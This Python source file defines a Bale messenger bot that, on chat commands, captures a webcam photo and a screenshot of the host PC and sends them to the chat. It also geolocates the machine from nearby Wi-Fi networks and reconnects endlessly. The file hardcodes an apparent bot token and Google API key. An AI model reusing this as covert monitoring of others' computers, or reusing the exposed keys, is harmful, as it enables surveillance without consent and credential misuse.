# python-bale-bot version: 2.5.0
# <User is_bot=True, first_name='Faraz_bot', username='Faraz_bot', id=1151667833>

from bale import Bot, Update, Message, InputFile
from bale import InlineKeyboardMarkup, InlineKeyboardButton, MenuKeyboardMarkup, MenuKeyboardButton
from balethon import Client # for sending message to spesific id
import os
import pyautogui
import time

client = Bot(token="1151667833:sGpf1ZgGjDZzc1JSwkEIskGaFF7ha2LsIfSCujfv")

# difining the keyboard layout ...
keyboard_text = '< - - - - - - - - - - - - - - - - - - - - - - >'
keyboard = (MenuKeyboardMarkup()
            .add(MenuKeyboardButton('/camera'), row=1)
            .add(MenuKeyboardButton('/screen'), row=2)
            .add(MenuKeyboardButton('/location'), row=3)
            )

while True:
    try:
        # using balethon to send a message to a specific id ...
        bot = Client("1151667833:sGpf1ZgGjDZzc1JSwkEIskGaFF7ha2LsIfSCujfv")  # Replace "TOKEN" with your actual token here
        bot.connect()
        bot.send_message("@farazmlz", "* --- [ bot is active ] ---*\nsend /start to see the commands availble.")  # Replace "@username" with your actual username here

        os.system('cls')
        # show when the bot is ready ...
        @client.event
        async def on_ready():
            print(f" <--- [{client.user.first_name}] is Ready ---> ")


        @client.event
        async def on_message(message: Message):
            # ---------------------------------------------------------------------------------------------------- >
            if message.content == "/camera":

                await message.reply('loading ...')

                # get the file location ---
                location = os.getcwd()
                file_path = location + "\\tools"

                print('-> file path is ' + file_path)
                # creating tool folder in desktop...
                if not os.path.exists(file_path): # check for existing of folder tools
                    os.makedirs(file_path)

                import cv2 as cv
                # initialize the camera ---
                cam_port = 0
                # cam_port = 1
                # cam = cv.VideoCapture(cam_port, cv.CAP_DSHOW) # this is for main cam
                cam = cv.VideoCapture(cam_port) # this is for secondary cam

                # reading the input using the camera
                result, image = cam.read()

                # If image will detected without any error, show result
                if result:
                    # saving image in local storage
                    loc = file_path + '\camera.png'
                    cv.imwrite(loc, image)
                    # cv.imwrite(r'C:\Users\Ravis\Desktop\tools\camera.png', image)

                # If captured image is corrupted, moving to else part
                else:
                    print("No image detected. Please! try again")

                # sending photo ---
                file = open(file_path + '\\camera.png', 'rb').read()
                photo = InputFile(file)
                await message.reply_photo(photo=photo, caption="Front Camera")

                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )
            
            # ---------------------------------------------------------------------------------------------------- >
            elif message.content == "/screen":
                await message.reply('loading ...')

                # creating tool folder in desktop...
                if not os.path.exists(r'C:\Users\Ravis\Desktop\tools'): # check for existing of folder tools
                    os.makedirs(r'C:\Users\Ravis\Desktop\tools')
                # taking and sending the screen shot ...
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(r'C:\Users\Ravis\Desktop\tools\screen.png')

                # sending photo ---
                file = open(r'C:\Users\Ravis\Desktop\tools\screen.png', 'rb').read()
                photo = InputFile(file)
                await message.reply_photo(photo=photo, caption="screen")

                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )
                

            elif message.content == "/start":
                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )
            # ---------------------------------------------------------------------------------------------------- >
            elif message.content == "/location":
                # import time
                import pywifi
                import requests
                import folium
                # import os

                print("collecting wifi data ...")

                # ------------------------------------------- ( collecting nearby wifi ) -------------------------------- >
                def get_wifi_data():
                    wifi_data = []
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]  # Assuming the first WiFi interface

                    iface.scan()
                    time.sleep(3)  # Wait for scanning to complete

                    networks = iface.scan_results()
                    for network in networks:
                        wifi_info = {
                            "ssid": network.ssid,
                            "macAddress": network.bssid,
                            "signalStrength": network.signal,
                            "signalToNoiseRatio": None  # Unfortunately, Windows doesn't provide SNR information
                        }
                        wifi_data.append(wifi_info)

                    return wifi_data

                # ------------------------------------------- ( collecting data from geolocation api ) -------------------------------- >
                def get_location(api_key, wifi_data):
                    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={api_key}"
                    headers = {"Content-Type": "application/json"}

                    payload = {
                        "considerIp": "false",
                        "wifiAccessPoints": wifi_data
                    }

                    try:
                        response = requests.post(url, json=payload, headers=headers)
                        data = response.json()
                        if 'location' in data:
                            latitude = data['location']['lat']
                            longitude = data['location']['lng']
                            accuracy = data['accuracy']
                            return latitude, longitude, accuracy
                        else:
                            print(f"Failed to retrieve location. Error: {data}")
                            return None
                    except Exception as e:
                        print(f"An error occurred: {e}")
                        return None

                # Example usage
                api_key = "AIzaSyB25GHw29xkCruIsRXniV9oUSbp3YleQ0o"  # Replace with your Google Geolocation API key
                wifi_data = get_wifi_data()
                # for test ---
                # wifi_data = [
                # #             # {'ssid': 'TPLINK', 'macAddress': '9c:53:22:b5:5c:3c:', 'signalStrength': -41, 'signalToNoiseRatio': None},
                #             {'ssid': 'hasan', 'macAddress': 'c4:e9:84:57:0d:45:', 'signalStrength': -86, 'signalToNoiseRatio': None},
                #             {'ssid': 'Vahid', 'macAddress': '3c:33:32:cc:70:f0:', 'signalStrength': -85, 'signalToNoiseRatio': None}
                #              ]

                # showing colected wifies nearby ---
                for i in range(len(wifi_data)):
                    print(wifi_data[i])
                    print("")
                    
                # showing the name of colected wifies nearby ---
                print("--------------------- i found ["+ str(len(wifi_data)) + "] wifies ---------------------")
                # print("\n--- ( wifi names are ) ----")
                for i in range(len(wifi_data)):
                    print(wifi_data[i]["ssid"])
                    print("-----------------")
                    time.sleep(0.3)

                # if there isnt enogh wifi network ---
                if len(wifi_data) < 2:
                    print(" there isn't enogh wifi Networks ! --->\n")

                # showing colected lat, long, accuracy ---
                if wifi_data:
                    location = get_location(api_key, wifi_data)
                    if location:
                        latitude, longitude, accuracy = location
                        print(f"Latitude: {latitude}, Longitude: {longitude}, Accuracy: {accuracy} meters")

                # ------------------------------------------- ( displaying data in map ) -------------------------------- >
                        
                def display_map_with_radius(latitude, longitude, radius):
                    # Create a map centered at the specified latitude and longitude
                    m = folium.Map(location=[latitude, longitude], zoom_start=18)

                    # Add a marker for the specified latitude and longitude
                    folium.Marker([latitude, longitude], tooltip='Location').add_to(m)

                    # Convert radius to a value appropriate for the map scale (adjust factor as needed)
                    # radius_adjusted = radius * 0.00001  # Adjust this factor based on your requirements

                    # Add a circle to represent the location radius
                    folium.Circle(
                        radius=accuracy,
                        location=[latitude, longitude],
                        color='blue',
                        fill=True,
                        fill_color='blue',
                        fill_opacity=0.2
                    ).add_to(m)

                    # Display the map
                    return m
                
                # get the file location ---
                location = os.getcwd()
                file_path = location + "\\map.html"
                print(file_path)

                # saving in the map ---
                map = display_map_with_radius(latitude, longitude, accuracy)
                map.save(file_path)  # Save the map to an HTML file
                map

                # opening chrome and showing saved html file ...
                os.system(f"start chrome {file_path}")
            # ---------------------------------------------------------------------------------------------------- >
            else:
                await message.reply('sorry, i dont know it\npress /start if you need a help.')


        # print(' ... < Bot Activated > ...\n')
        client.run()

    except:
        os.system('cls')
        # ! your code here --->
        print(" No internet Connection ... \n")
        # ! ------------------>

    delay_sec = 20
    for i in range(delay_sec, 0, -1):
        print(" ", "\r", end=' ')
        print("reconnecting in [" + str(i) + "] sec ", "\r", end=' ')
        time.sleep(1)
